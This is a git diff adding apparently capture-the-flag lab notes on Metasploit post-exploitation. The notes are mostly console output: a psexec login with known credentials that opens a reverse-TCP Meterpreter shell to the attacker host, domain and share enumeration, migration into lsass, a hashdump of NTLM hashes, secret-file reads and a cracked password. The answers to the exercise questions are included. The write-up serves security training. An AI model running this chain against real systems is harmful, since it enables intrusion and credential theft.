@@ -392,3 +392,397 @@ Password: Password1
 └─$ msfconsole
                                                   
 
+                 _---------.                                                               
+             .' #######   ;."                                                              
+  .---,.    ;@             @@`;   .---,..                                                  
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                 
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                 
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                 
+     "--'.@@@  -.@        @ ,'-   .'--"                                                    
+          ".@' ; @       @ `.  ;'                                                          
+            |@@@@ @@@     @    .                                                           
+             ' @@@ @@   @@    ,                                                            
+              `.@@@@    @@   .                                                             
+                ',@@     @   ;           _____________                                     
+                 (   3 C    )     /|___ / Metasploit! \                                    
+                 ;@'. __*__,."    \|--- \_____________/                                    
+                  '(.,...."/                                                               
+
+       =[ metasploit v6.1.39-dev                          ]
++ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
++ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up 
+to a file, use the makerc command
+```
+```text
+msf6 > use exploit/windows/smb/psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(windows/smb/psexec) > show options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                                 yes       The target host(s), see https://githu
+                                                    b.com/rapid7/metasploit-framework/wik
+                                                    i/Using-Metasploit
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to be used on
+                                                    target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SMBDomain             .                no        The Windows domain to use for authent
+                                                    ication
+   SMBPass                                no        The password for the specified userna
+                                                    me
+   SMBSHARE                               no        The share to connect to, can be an ad
+                                                    min share (ADMIN$,C$,...) or a normal
+                                                     read/write folder share
+   SMBUser                                no        The username to authenticate as
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proces
+                                        s, none)
+   LHOST     192.168.13.129   yes       The listen address (an interface may be specified
+                                        )
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+```text
+msf6 exploit(windows/smb/psexec) > set SMBUser ballen
+SMBUser => ballen
+```
+```text
+msf6 exploit(windows/smb/psexec) > set SMBPass Password1
+SMBPass => Password1
+```
+```text
+msf6 exploit(windows/smb/psexec) > set lhost 10.11.81.220
+lhost => 10.11.81.220
+```
+```text
+msf6 exploit(windows/smb/psexec) > set rhosts 10.10.144.209
+rhosts => 10.10.144.209
+```
+```text
+msf6 exploit(windows/smb/psexec) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 10.11.81.220:4444 
+[*] 10.10.144.209:445 - Connecting to the server...
+[*] 10.10.144.209:445 - Authenticating to 10.10.144.209:445 as user 'ballen'...
+[*] 10.10.144.209:445 - Selecting PowerShell target
+[*] 10.10.144.209:445 - Executing the payload...
+[+] 10.10.144.209:445 - Service start timed out, OK if running a command or non-service executable...
+
+[*] Sending stage (175174 bytes) to 10.10.144.209
+[*] Meterpreter session 1 opened (10.11.81.220:4444 -> 10.10.144.209:59421 ) at 2022-08-24 15:42:05 -0400
+```
+```text
+meterpreter >
+```
+```text
+meterpreter > pwd
+C:\Windows\system32
+```
+```text
+meterpreter > sysinfo
+Computer        : ACME-TEST
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : FLASH
+Logged On Users : 7
+Meterpreter     : x86/windows
+```
+```text
+meterpreter > use post/windows/gather/enum_domain
+Loading extension post/windows/gather/enum_domain...
+[-] Failed to load extension: No module of the name post/windows/gather/enum_domain found
+```
+```text
+meterpreter > 
+Background session 1? [y/N]  y
+[-] Unknown command: y
+```
+```text
+msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
+```
+```text
+msf6 post(windows/gather/enum_domain) > options
+
+Module options (post/windows/gather/enum_domain):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+```
+```text
+msf6 post(windows/gather/enum_domain) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACM  10.11.81.220:4444 -> 10.1
+                                     E-TEST                     0.144.209:59421  (10.10.1
+                                                                44.209)
+```
+```text
+msf6 post(windows/gather/enum_domain) > set session 1
+session => 1
+```
+```text
+msf6 post(windows/gather/enum_domain) > exploit
+
+[+] FOUND Domain: FLASH
+[+] FOUND Domain Controller: ACME-TEST (IP: 10.10.144.209)
+[*] Post module execution completed
+```
+```text
+msf6 post(windows/gather/enum_domain) >
+```
+```text
+meterpreter > 
+Background session 1? [y/N]  y
+[-] Unknown command: y
+```
+```text
+msf6 exploit(windows/smb/psexec) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACM  10.11.81.220:4444 -> 10.1
+                                     E-TEST                     0.144.209:59444  (10.10.1
+                                                                44.209)
+```
+```text
+msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares
+```
+```text
+msf6 post(windows/gather/enum_shares) > options
+
+Module options (post/windows/gather/enum_shares):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CURRENT  true             yes       Enumerate currently configured shares
+   ENTERED  true             yes       Enumerate Recently entered UNC Paths in the Run Di
+                                       alog
+   RECENT   true             yes       Enumerate Recently mapped shares
+   SESSION                   yes       The session to run this module on
+```
+```text
+msf6 post(windows/gather/enum_shares) > set session 1
+session => 1
+```
+```text
+msf6 post(windows/gather/enum_shares) > exploit
+
+[*] Running against session 1
+[*] The following shares were found:
+[*]     Name: SYSVOL
+[*] 
+[*]     Name: NETLOGON
+[*] 
+[*]     Name: speedster
+[*] 
+[*] Post module execution completed
+```
+```text
+msf6 post(windows/gather/enum_shares) >
+```
+```text
+msf6 post(windows/gather/enum_shares) > sessions -i 1
+[*] Starting interaction with 1...
+```
+```text
+meterpreter > pwd
+C:\Windows\system32
+```
+```text
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name           Arch  Session  User                    Path
+ ---   ----  ----           ----  -------  ----                    ----
+ 0     0     [System Proce
+             ss]
+ 4     0     System         x64   0
+ 68    4     Registry       x64   0
+ 396   4     smss.exe       x64   0
+ 480   704   dwm.exe        x64   1        Window Manager\DWM-1    C:\Windows\System32\dw
+                                                                   m.exe
+ 560   548   csrss.exe      x64   0
+ 636   628   csrss.exe      x64   1
+ 652   548   wininit.exe    x64   0
+ 704   628   winlogon.exe   x64   1        NT AUTHORITY\SYSTEM     C:\Windows\System32\wi
+                                                                   nlogon.exe
+ 764   652   services.exe   x64   0
+ 780   652   lsass.exe      x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\ls
+                                                                   ass.exe
+ 888   764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 904   764   svchost.exe    x64   0        NT AUTHORITY\NETWORK S  C:\Windows\System32\sv
+                                           ERVICE                  chost.exe
+ 956   764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 1000  764   svchost.exe    x64   0        NT AUTHORITY\NETWORK S  C:\Windows\System32\sv
+                                           ERVICE                  chost.exe
+ 1036  764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 1044  764   svchost.exe    x64   0
+ 1164  764   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER  C:\Windows\System32\sv
+                                           VICE                    chost.exe
+ 1172  764   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER  C:\Windows\System32\sv
+                                           VICE                    chost.exe
+ 1180  764   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER  C:\Windows\System32\sv
+                                           VICE                    chost.exe
+ 1228  764   svchost.exe    x64   0        NT AUTHORITY\NETWORK S  C:\Windows\System32\sv
+                                           ERVICE                  chost.exe
+ 1340  3240  conhost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\co
+                                                                   nhost.exe
+ 1408  764   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER  C:\Windows\System32\sv
+                                           VICE                    chost.exe
+ 1432  764   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER  C:\Windows\System32\sv
+                                           VICE                    chost.exe
+ 1556  764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 1752  764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 2216  652   fontdrvhost.e  x64   0        Font Driver Host\UMFD-  C:\Windows\System32\fo
+             xe                            0                       ntdrvhost.exe
+ 2224  704   fontdrvhost.e  x64   1        Font Driver Host\UMFD-  C:\Windows\System32\fo
+             xe                            1                       ntdrvhost.exe
+ 2292  764   spoolsv.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sp
+                                                                   oolsv.exe
+ 2316  764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 2336  764   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER  C:\Windows\System32\sv
+                                           VICE                    chost.exe
+ 2384  764   amazon-ssm-ag  x64   0        NT AUTHORITY\SYSTEM     C:\Program Files\Amazo
+             ent.exe                                               n\SSM\amazon-ssm-agent
+                                                                   .exe
+ 2404  764   svchost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\sv
+                                                                   chost.exe
+ 2436  2116  powershell.ex  x86   0        NT AUTHORITY\SYSTEM     C:\Windows\SysWOW64\Wi
+             e                                                     ndowsPowerShell\v1.0\p
+                                                                   owershell.exe
+ 2444  764   LiteAgent.exe  x64   0        NT AUTHORITY\SYSTEM     C:\Program Files\Amazo
+                                                                   n\XenTools\LiteAgent.e
+                                                                   xe
+ 2468  764   Microsoft.Act  x64   0        NT AUTHORITY\SYSTEM     C:\Windows\ADWS\Micros
+             iveDirectory.                                         oft.ActiveDirectory.We
+             WebServices.e                                         bServices.exe
+             xe
+ 2476  764   ismserv.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\is
+                                                                   mserv.exe
+ 2512  764   dns.exe        x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\dn
+                                                                   s.exe
+ 2528  764   dfssvc.exe     x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\df
+                                                                   ssvc.exe
+ 2540  764   dfsrs.exe      x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\df
+                                                                   srs.exe
+ 2980  764   vds.exe        x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\vd
+                                                                   s.exe
+ 3004  2384  ssm-agent-wor  x64   0        NT AUTHORITY\SYSTEM     C:\Program Files\Amazo
+             ker.exe                                               n\SSM\ssm-agent-worker
+                                                                   .exe
+ 3012  3004  conhost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\co
+                                                                   nhost.exe
+ 3120  2436  conhost.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\co
+                                                                   nhost.exe
+ 3156  704   LogonUI.exe    x64   1        NT AUTHORITY\SYSTEM     C:\Windows\System32\Lo
+                                                                   gonUI.exe
+ 3240  1492  powershell.ex  x86   0        NT AUTHORITY\SYSTEM     C:\Windows\SysWOW64\Wi
+             e                                                     ndowsPowerShell\v1.0\p
+                                                                   owershell.exe
+ 3728  764   msdtc.exe      x64   0        NT AUTHORITY\NETWORK S  C:\Windows\System32\ms
+                                           ERVICE                  dtc.exe
+```
+```text
+meterpreter > migrate 780
+[*] Migrating from 2436 to 780...
+[*] Migration completed successfully.
+```
+```text
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
+ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
+lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
+erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
+ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:0b1f3ffad5291f41cdde9fafce0f4c11:::
+```
+```text
+meterpreter > search -f secrets.txt
+
+Found 1 result...
+=================
+
+Path                                                            Size (bytes)  Modified (UTC)
+----                                                            ------------  --------------
+c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 03:44:27 -0400
+```
+```text
+meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
+My Twitter password is KDSvbsw3849!
+```
+```text
+meterpreter > search -f realsecret.txt
+
+Found 1 result...
+=================
+
+Path                               Size (bytes)  Modified (UTC)
+----                               ------------  --------------
+c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 04:30:24 -0400
+```
+```text
+meterpreter >
+```
+```text
+meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
+The Flash is the fastest man alive
+```
+What is the computer name? *ACME-TEST* (Use the "sysinfo" command)
+What is the target domain? *FLASH* (Use the "post/windows/gather/enum_domain" module. You will need to background Meterpreter first and set the SESSION parameter. )
+What is the name of the share likely created by the user? *speedster* (Use the "post/windows/gather/enum_shares" module. You will need to background Meterpreter first and set the SESSION parameter. )
+What is the cleartext password of the jchambers user? *Trustno1* (You can use an online hash checker like crackstation.net)
+Hash	Type	Result
+69596c7aa1e8daee17f8e78870e25a5c	NTLM	Trustno1
+Where is the "secrets.txt"  file located? `c:\Program Files (x86)\Windows Multimedia Platform` (You can use any of these commands: search -f *.txt search -f secrets.txt)
+What is the Twitter password revealed in the "secrets.txt" file? *KDSvbsw3849!*
+Where is the "realsecret.txt" file located? *realsecret.txt *
+What is the real secret? *The Flash is the fastest man alive*
+
+## Flags / Answers
+- What is the NTLM hash of the jchambers user? *69596c7aa1e8daee17f8e78870e25a5c*  (In the Meterpreter prompt: You will need to migrate to the "lsass.exe" process first (ps will list its PID), then run "hashdump".)
+
+## Notes / Lessons Learned
+[[Metasploit Exploitation]]
+
